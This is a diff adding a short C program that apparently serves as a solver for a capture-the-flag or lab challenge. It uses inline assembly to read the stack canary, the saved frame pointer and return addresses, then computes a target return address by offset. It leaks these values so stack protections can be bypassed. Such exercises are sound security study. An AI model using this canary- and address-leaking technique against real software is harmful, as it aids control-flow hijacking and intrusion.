@@ -1,0 +1,55 @@
+#include <stdio.h>
+
+typedef int (*printf_ptr_t)(const char *format, ...);
+
+void solver(printf_ptr_t fptr)
+{
+	// find canary value
+	unsigned long long canary;
+	__asm__("mov %%fs:0x28, %0"
+			: "=r"(canary));
+	fptr("canary\n", canary);
+	fptr("0x%llx\n", canary);
+
+	// find main rdp
+	unsigned long *main_rdp;
+	__asm__("mov %%rbp, %0"
+			: "=r"(main_rdp));
+	fptr("main_rdp\n");
+	fptr("0x%lx\n", *main_rdp);
+
+	// solver's return addr = main + 0xa2ff
+	// guess's return addr = main + 0xa3aa
+	unsigned long solver_retadr;
+	__asm__("movq +0x8(%%rbp), %0"
+			: "=r"(solver_retadr));
+	fptr("solver_retadr\n");
+	fptr("0x%lx\n", solver_retadr);
+
+	unsigned long guess_retadr = solver_retadr + 171;
+	fptr("guess_retadr\n");
+	fptr("0x%lx\n", guess_retadr);
+
+	// // find solver rbp
+	// char *solver_rbp;
+	// __asm__("mov %%rbp, %0"
+	// 		: "=r"(solver_rbp));
+	// fptr("solver_rbp\n");
+	// fptr("%p\n", solver_rbp);
+
+	// // find where is magic
+	// int magic;
+	// __asm__("mov +0x1C(%%rbp), %0"
+	// 		: "=r"(magic));
+	// fptr("magic\n");
+	// fptr("%x\n", magic);
+}
+
+int main()
+{
+	char fmt[16] = "** main = %p\n";
+	printf(fmt, main);
+	printf("** solver = %p\n", solver);
+	solver(printf);
+	return 0;
+}
